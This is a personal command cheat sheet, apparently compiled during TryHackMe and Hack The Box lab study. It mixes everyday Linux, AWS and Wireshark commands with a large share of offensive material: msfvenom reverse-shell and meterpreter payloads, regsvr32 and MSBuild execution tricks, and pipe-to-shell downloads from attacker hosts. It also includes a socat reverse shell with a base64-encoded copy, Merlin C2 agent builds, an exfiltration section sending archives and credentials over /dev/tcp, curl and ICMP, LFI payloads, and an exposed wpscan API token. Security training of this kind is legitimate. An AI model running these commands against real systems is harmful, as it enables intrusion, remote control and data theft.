



ffuf, ffuf -u https://1.1.1.1/FUZZ -w <path-wordlist> -recursion
ffuf, ffuf -u http://1.1.1.1/FUZZ/ -w <path-wordlist> -p 1    -> every second

awk, |awk '{print($4)}' | awk '{s+=$1} END {print s}'   adding 
awk, dc -f <(awk -F, '{print $2}' file.csv) -e '[+z1<r]srz1<rp'     
awk, awk '{print NR,$0}' employee.txt 
awk, awk 'NR==3, NR==6 {print NR,$0}' employee.txt    -> Another use of NR built-in variables (Display Line From 3 to 6)  
awk, awk 'NF < 0' geeksforgeeks.txt           -> To print any non empty line if present  
awk, awk '{ if (length($0) > max) max = length($0) } END { print max }' geeksforgeeks.txt     -> To find the length of the longest line present in the file
awk, awk '{ if($3 == "B6") print $0;}' geeksforgeeks.tx             -> To find/check for any string in any specific column
awk, awk 'BEGIN { for(i=1;i<=6;i++) print "square of", i, "is",i*i; }' 
awk, https://www.geeksforgeeks.org/linux-unix/awk-command-unixlinux-examples/

tmux,  Ctrl - r to search 


msfvenom, msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 -f elf > reverse.elf
msfvenom, msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=443 -f elf > shell.elf
msfvenom, msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 VERBOSE=true -f ps1 -o meterpreter.ps
msfvenom, msfvenom -p php/meterpreter_reverse_tcp LHOST=1.1.1.1  LPORT=443 -f raw > shell.php
msfvenom, cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
msfvenom, msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1  LPORT=2222 -f exe > mysqld.exe
msfvenom, 
msfvenom, msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=1.1.1.1 -f dll -a x86 > live0fftheland.dll  ->  set payload windows/meterpreter/reverse_tcp 
msfvenom, c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll  
msfvenom, c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
msfvenom,
msfvenom, git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
msfvenom, msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
msfvenom, msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
msfvenom, python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
msfvenom, c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
msfvenom, sessions -u -1 upgrade the last opened session to Meterpreter
msfvenom, Socks Proxy use auxiliary/server/socks_proxy
msfvenom, Socks Proxy run srvhost=127.0.0.1 srvport=9050 version=4a
msfvenom, Socks Proxy curl --proxy socks4a://localhost:9050 http://10.10.114.28
msfvenom, Socks Proxy proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.114.28
msfvenom, 
msfvenom, 
msfvenom, 
msfvenom, 
msfvenom, 
msfvenom, 


curl,  curl http://86.131.55.212:8888/log.tar  --proxy http://bastion:3128
curl, curl -F 'file=@test.txt' http://86.131.55.212:7777 --proxy http://bastion:3128
curl, curl http://192.168.171.183/exiftest.php   -F myFile=@example.jpg
curl, curl http://exfiltrated.offsec/ -s | html2text | tail


priv, /etc/doas.conf
priv, /etc/systemd
priv, /etc/fstab
priv,getfacl system/zeno-monitoring.service 


find, find -type f -maxdepth 1 -writable
find, find / -perm /u=s
find, find / -type f ! -perm 777
find, find /tmp -type f -empty
find, find /tmp -type f -name ".*" # File all Hidden Files
find, find / -mtime +50 –mtime -100 # . Find Last 50-100 Days Modified Files
find, find / -amin -60 # Find Accessed Files in Last 1 Hour
find, find / -size +50M -size -100M # Find Size between 50MB – 100MB
find, find / -type f -size +100M -exec rm -f {} \; #  Find and Delete 100MB Files
find, find . -exec ls {} \;
find, find . -ea 
find, find / -type f -perm -04000 -ls 2>/dev/null



python, proxies={"http":"http://127.0.0.1:8080"}
python, /usr/bin/python3.7 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
python, __import__('os').system('ping 10.11.48.49-c3')#
tar, tar -rvf tar -f file.tar --delete file1 file2 , removing
tar, tar -rvf archive.tar newfile adding
tar, tar -xf archive.tar file1 file2 extracting specif 
tar, tar -xf archive.tar file1 file2 listing tar chrives
tar, # tar -xf file_name.tar -C /target/directory
tar, # tar -xf file_name.tar.gz --directory /target/directory
tar, tar --extract --file=tecmintbackup.tar.gz tecmintbackup.xml
tar, tar -xvf Phpfiles-org.tar --wildcards '*.php'
tar, 

spawn, python3 -c "__import__('pty').spawn('/bin/bash')"
spawn, python -c 'import pty;pty.spawn("/bin/bash")'
spawn, python3 -c 'import pty;pty.spawn("/bin/bash")'
spawn, stty raw -echo && fg 
spawn, export TERM=xterm-256color &&  export SHELL=/bin/bash && stty cols 198 rows 48
spawn, export TERM=xterm-256color 
spawn, export SHELL=bash 
spawn, 
spawn, SHELL=/bin/bash script -q /dev/null 
spawn, Ctrl-Z 
spawn, stty raw -echo 
spawn,fg 
spawn, reset 
spawn, xterm
spawn, stty cols 198 rows 48

chisel, ./chisel server -p 8000 -reverse -v 
chisel, ./chisel client 1.1.1.1:8000 R:22:127.0.0.1:22
chisel, ./chisel client 1.1.1.1:8000 R:3000:127.0.0.1:3000
chisel, ./chisel client 1.1.1.1:8000 R:5000:127.0.0.1:5000
chisel, Dynamic server /chisel server -p 12000 --reverse  ;;;;   client 10.50.70.97:12000 R:socks &  ;;    proxychains.conf socks5 127.0.0.1 1080 tylko ;; 
chisel, Dunamic proxychains -q nmap -sT -Pn -p 22,80 -sV -sC , proxychains -q curl http://127.0.0.1:80,   proxychains -q mysql -h 192.168.100.1 -u admin -p

sed, sed -i 's/192.168.1.152/192.169.10.13/' exploit.py 
sed, sed  -i '11 s/upload =/#upload =/' exploit.py   
sed, sed -e '/socks4/s/^/#/g' -i /etc/proxychains.conf 
sed, sed -i "30i system('whoami')" exploit.py 
sed, sed -e 's/\(.*\)/\L\1/' input.txt > output.txt 
sed, sed -e 's/\(.*\)/\U\1/' input.txt > output.txt 
sed, sed '3 a\ dodaje po 
sed, sed '1 i\ ' dodaje przed 
sed, test.txt | sed -n '10-15p' drukuje linie
sed, test.txt | sed -n '11p' 
sed, sed -n -e 5,8p -e 10p file  -> prints specific lines
sed, sed -n -e 5p -e 8p file
sed, sed, cat -n text.txt | sed '9,12!d'
sed, cat conn.log | sed '7,$!d' to drukuje tylko od 7 lini do konca
sed, sed '7d;12d;16d' input.txt To delete specified lines from the input.txt file, use:
sed, sed '5,8d' input.txt Delete Range of Lines
sed, sed -i '/^$/d' input.txt Delete Empty Line
sed, sed '/Hard/d' input.txt Delete if Line Matches Pattern
sed, sed -i '/hard/I d' input.txt ed performs simple string matching, so the matching is case-sensitive. If you want to perform a case-insensitive search, use the I flag:
sed, sed '/1991/!d' input.txt Delete Lines Not Matching Pattern
sed, sed -i '/^1/d' file.txt elete Line if it Starts With Specified Character or Character
sed, duzo przykladow https://phoenixnap.com/kb/sed-delete-line


grep, grep -oP "(?<=wireshark,\s).*(?=)"   -> w koncu bierze wszystko do zaczyna sie na wiershark spacja i wtedy moj string do konca
grep, grep -oh "\w*.dll" dll.txt
grep,  grep -rwn '/var/' -i '^\$2y\$\w*'
grep, grep -x '.\{8,20\}' > 8-20_length_wordlist 
grep, grep -o '[^ ]*[a-z][^ ]*' > contains_lowercase.txt 
grep, grep -o '[^ ]*[A-Z][^ ]*' > contains_uppercase.txt 
grep, grep -o '[^ ]*[0-9][^ ]*' > contains_numbers.txt 
grep, grep -v "^[A-Za-z0-9]*$" > contains_special.txt 
grep,  grep -o "FLAG{.*}" f.01
grep, cat u  | grep -P -i  '\d+-\d+-\d+'
grep, grep -oP "href=\"([^\"]+)" -> to pokazuje wszystkie linki z plimku website
grep, grep -v -e 'test1' -e 'test2' Display lines that don't match one or both "test1" and "test2" strings.



download,  curl http://0.0.0.0/pspy64  -o pspy64  &
download,  curl http://0.0.0.0/linpeas.sh  -o linpeas.sh  &
download,  curl http://0.0.0.0/chisel/chisel  -o chisel  &
download,  curl http://0.0.0.0/lse.sh  -o lse.sh &
download,  curl http://0.0.0.0/ncat  -o ncat  &
download,  curl http://0.0.0.0/socat  -o socat &
download, sudo nc -q 5 -lvnp 80 < linpeas.sh #Host     cat < /dev/tcp/1.1.1.1/80 | sh #Victim
download, nc -lvnp 9002 | tee linpeas.out #Host        curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim



sockat, openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
sockat, cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
sockat, socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
sockat, "socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash."
sockat, c29jYXQgT1BFTlNTTDoxMC4yMC4zMC4xOjQ0NDMsdmVyaWZ5PTAgRVhFQzovYmluL2Jhc2guCg==

merlin, go run main.go
merlin, Export GOOS=linux;export GOARCH=amd64; go build -ldflags "-s -w -X main.url=//192.168.0.11:443" -o shell.elf main.go
merlin, GOOS=windows GOARCH=amd64 go build -ldlags "-X main.url=//192.168.0.11:443" -o shell.exe main.go
merlin, listeners -> use http2 -> start -> set PSK SecurePSK!23@456
merlin, ./merlin_agent -url 'https://[IP_ADDR_OF_MERLIN_SERVER]:443 -psk '[PSK_YOU_CREATED_FOR_LISTENER]'


ip, wget -qO - https://api.ipify.org; echo
ip, wget -qO- https://ipecho.net/plain ; echo
ip, curl https://ipinfo.io/ip
ip, sudo ip addr add 192.168.1.50/24 dev eth0 && sudo ip route add default via 192.168.1.1
ip, sudo ip link set <interface> up.
ip, ip route add default via 192.0.2.2 dev eth0

tor, torsocks wget -qO - https://api.ipify.org; echo
tor, source torsocks on ### Tor mode activated. Every command will be torified for this shell.
tor, echo ". torsocks on" >> ~/.bashrc
email, https://toolbox.googleapps.com/apps/messageheader/analyzeheader
email, https://mha.azurewebsites.net/
email, mailheader.org.
email,  https://ipinfo.io/
email, https://urlscan.io/
email, https://talosintelligence.com/reputation
email, https://www.convertcsv.com/url-extractor.htm
email, https://talosintelligence.com/talos_file_reputation
email, https://app.any.run/
email, https://www.joesecurity.org/
email, notice that the tool notifies us that 'Reply-To no present' although it provides the alternative header information, Return-Path.
email, https://www.phishtool.com/
email, to get conent of attachment from wireshark use fileter imf.content.typ
xfreerdp, xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard
xfreerdp, xfreerdp /v:ip_address /u:username /p:password /cert:ignore
xfreerdp, xfreerdp /v:ip_address /u:username /p:password +clipboard
xfreerdp, xfreerdp /v:ip_address /u:username /p:password /dynamic-resolutionxfreerdp, xfreerdp /u:username /p:password /v:ip_address /sound:sys:alsa 


msfvenom, msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta

nmap, nmap -sC -sV -oN nmap.txt 1.1.1.1 -Pn 
nmap, nmap -p- 1.1.1.1 --open -Pn
nmap, nmap -r -v --min-rate 1000 -p- 1.1.1.1
nmap, nmap -sU --top-ports 20 -sC -sV -Pn 1.1.1.1
nmap, cat ports.txt  | grep open | grep -oE '^[0-9]+[///]' | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$/ /g'
nmap, nmap --script=vuln --script-args http.useragent="<USER AGENT HERE>" 1.1.1.1
nmap, user agent can be found on https://developers.whatismybrowser.com/useragents/explore/
nmap, s also possible to evade detection by using SYN (-sS) or "stealth" scan mode
nmap, nmap -vv -sV -O - script=vuln -p 1883 1.1.1.1
ffuf, ffuf -u https://codingo.io/W1 -w ./wordlist.txt:W1
ffuf, ffuf -u https://W2/W1 -w ./wordlist.txt:W1,./domains.txt:W2 
ffuf, 
gobuster, gobuster dns -d "blurry.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100    
gobuster, gobuster dir -u http://1.1.1.1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt -o gobuster.txt
gobuster, gobuster dir -u http://1.1.1.1 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x php,txt -o gobuster.txt
gobuster, gobuster dns   -r 1.1.1.1 -d 'mka.com'  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster, gobuster vhost -u https://example.com -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster, extra -t 4 --delay 1s  -b 500,403 -o results.txt


nikto, nikto -host 1.1.1.1 -C all


lfi, /proc/self/environ 
lfi, ../../../var/log/apache2/access.log 
lfi, test.php?file=php://filter/convert.base64-encode/resource=config.php
wpscan, wpscan --url http://wordy -e u,vp --plugins-detection aggressive --api-token jjQiNs5vrX03k07Tv0YsrIPTDgsnpslQpUHaXDg2FUY
iptables, iptables -L --line-numbers
iptables, sudo iptables -L -nv
iptables, sudo iptables -D INPUT 10
iptables,  sudo iptables -I INPUT 3 -p tcp --dport 443 -j ACCEPT
iptables, sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3000
iptables, iptables  -I OUTPUT 1 -p tcp --dst 143.204.191.0/24 -j DROP
iptables, sudo iptables -t nat -A OUTPUT -p tcp --dport 3333 -j REDIRECT --to-port 5555   => to dziala
iptables, sudo iptables -t nat -L -n -v  to see rule    => to dziala
iptables, sudo iptables -t nat -D OUTPUT 1    remove only line 1  => to dzila




git, git diff --summary b972b3d 2acba1c
git, git log
git, git log --oneline
git, git remote -v - shows the linked repository
git, git log --abbrev-commit --graph --pretty=oneline
git, git branch -a -vv



dig, dig -t AXFR redteam.thm @10.10.150.117
dig, dig txt wp.pl  - to check spf
dig, dig ns yahoo.com
dig, dig a yahoo.com
nslookup, nslookup -type=txt wp.pl

wireshark, http.server contains "Apache"
wireshark, http.host matches "\.(php || html)"
wireshark, tcp.port in {80 443 8080}
wireshark, upper(http.server) contains "APACHE"
wireshark, lower(http.server) contains "apache"
wireshark, string(frame.number) matches "[13579]$"
wireshark, (http.response.code == 200 ) && (http.content_type matches "image(gif||jpeg)")
wireshark, tcp.flags == 2 -> Only SYN flag.
wireshark, tcp.flags.syn == 1 -> SYN flag is set. The rest of the bits are not important.
wireshark, tcp.flags == 16 -> Only ACK flag.
wireshark, tcp.flags.ack == 1 -> ACK flag is set. The rest of the bits are not important.
wireshark, tcp.flags == 18 -> Only SYN, ACK flags.
wireshark, (tcp.flags.syn == 1) and (tcp.flags.ack == 1) -> SYN and ACK are set. The rest of the bits are not importan
wireshark, tcp.flags == 4 -> Only RST flag.
wireshark, tcp.flags.reset == 1 -> RST flag is set. The rest of the bits are not important.
wireshark, tcp.flags == 20 -> Only RST, ACK flags.
wireshark, (tcp.flags.reset == 1) and (tcp.flags.ack == 1 -> RST and ACK are set. The rest of the bits are not important.
wireshark, tcp.flags == 1 -> Only FIN flag
wireshark, tcp.flags.fin == 1 -> FIN flag is set. The rest of the bits are not important



exfiltration, TCP socket   nc -lvp 8080 > /tmp/task4-creds.data 
exfiltration, TCP Socket   tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
exfiltration, TCP Socket   nc -lnvp > task4-creds.tar  and then dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
exfiltration, using SSH    tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
exfiltration, curl         curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php 
exfiltration, curl         sudo sed -i 's/ /+/g' /tmp/http.bs64
exfiltration, curl         cat /tmp/http.bs64 | base64 -d | tar xvfz - 
exfiltration, Generating encrypted Tunneling Clients       python3 neoreg.py generate -k thm  
exfiltration, Generating encrypted Tunneling Clients       python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php
exfiltration, Http tunneling curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
exfiltration, Http tunneling python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php
exfiltration, ICMP    sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
exfiltration, ICMP    sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
exfiltration, 


zeek, docker run -it -v `pwd`:/pcap broplatform/bro:4.2.0 /bin/bash
zeek, zeek -C -r sample.pcap 
zeek, cat signatures.log | zeek-cut uid src_addr dst_addr
zeek, zeek -C -r sample.pcap -s sample.sig  -> option -s to signature file
zeek, cat dns.log | zeek-cut -u -d ts id.orig_h id.resp_h query qclass qclass_name qtype qtype_name answers
zeek, sudo docker run -v /investigation/2022-01-03:/pcap  -it zeekurity/zeek 
sort, sort -k 3 -t , -n -r  cheese.csv
sort, sort -k 2 -t , cheese.csv
sort, sort -k 2 -t , cheese.csv
sort, sort | uniq -c 
cut, cut -f2 file.txt - to jest najlatwiesze zeby wydrucoeac columneA

linux, check session last -f /var/log/wtmp

aws, aws ec2 describe-instances --filters Name=instance-state-name,Values=running --output table 
aws, aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query "Reservations[*].Instances[*].InstanceId" --output text
aws, aws ec2 describe-instances --instance-ids i-1234567890abcdef0
aws, aws ec2 describe-instances     --instance-ids i-0da6edcee61744ec6 --filters Name=tag-key,Values=Name     --query 'Reservations[*].Instances[*].{Instance:InstanceId,AZ:Placement.AvailabilityZone,Name:Tags[?Key==`Name`]|[0].Value}'     --output table
aws, ws ec2 describe-instances --instance-ids i-0da6edcee61744ec6  --query 'Reservations[*].Instances[*].{Instance:InstanceId,Subnet:SubnetId,VPC:VpcId,SecurityGroups:SecurityGroups[*].GroupId}'
aws, aws  ec2 describe-security-groups --group-ids sg-0a024534204a9b4c7
aws, aws ec2 create-security-group --group-name MySecurityGroup --description "My security group" --vpc-id vpc-1a2b3c4d
aws, aws ec2 authorize-security-group-ingress --group-id sg-0a024534204a9b4c7 --protocol tcp --cidr 0.0.0.0/0 --port 4444
aws, export AWS_PROFILE=user1
aws, get ip public aws ec2 describe-instances   --filters Name=instance-state-name,Values=running   --query 'Reservations[*].Instances[*].{Instance:InstanceId,PublicIPAddress:PublicIpAddress}'
aws, aws ec2 import-key-pair --key-name "abc" --public-key-material fileb://mka.pub
aws, aws ec2 create-internet-gateway --query InternetGateway.InternetGatewayId --output text
aws, aws ec2 attach-internet-gateway --vpc-id vpc-2f09a348 --internet-gateway-id igw-1ff7a07b
aws, aws ec2 create-route-table --vpc-id vpc-2f09a348 --query RouteTable.RouteTableId --output text
